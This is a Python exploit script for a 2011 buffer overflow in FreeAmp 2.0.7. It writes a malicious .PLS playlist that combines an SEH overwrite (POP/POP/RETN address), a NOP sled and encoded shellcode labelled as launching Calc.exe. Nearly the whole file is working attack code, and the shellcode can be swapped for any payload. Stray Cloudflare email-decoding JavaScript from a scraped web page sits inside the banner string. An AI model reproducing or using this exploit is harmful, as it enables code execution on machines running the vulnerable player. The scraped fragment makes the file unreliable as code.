#!/usr/bin/python
#
#[+]Exploit Title: FreeAmp 2.0.7 .PLS File Buffer Overflow Exploit
#[+]Date: 24\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.exploit-db.com/application/17441/
#[+]Version: 2.0.7
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#
 
from struct import pack
import os
import sys
from time import sleep
 
if os.name == "nt":
    os.system("cls")
    os.system("color 4f")
    os.system("Title FreeAmp .PLS File Buffer Overflow Exploit")
else:
    os.system("clear")
 
print '''
         
        FreeAmp 2.0.7 .PLS File Buffer Overflow Exploit
        Created By C4SS!0 G0M3S
        E-mail louredo_@hotmail.com<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>
         
'''
sleep(2)
#Shellcode WinExec "Calc.exe"
shellcode = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca")
 
buf = ("\x41" * 893)
buf += ("\xeb\x08\x90\x90")
buf += pack('<L',0x004027BF)#POP/POP/RETN
buf += "\x90" * 20
buf += shellcode
buf += "\x41" * (30000-len(buf))
exploit = ('''[playlist]
File1=http://'''+buf+'''
NumberOfEntries=1
Version=2
''')
print "\t\t[+]Creating File  Exploit.pls..."
sleep(1)
try:
    f = open("Exploit.pls","wb")
    f.write(exploit)
    f.close()
    print "\t\t[+]File Exploit.pls Created."
    sleep(2)
except:
    print "\t\t[-]Error in Create file Exploit.pls"
    sleep(1)
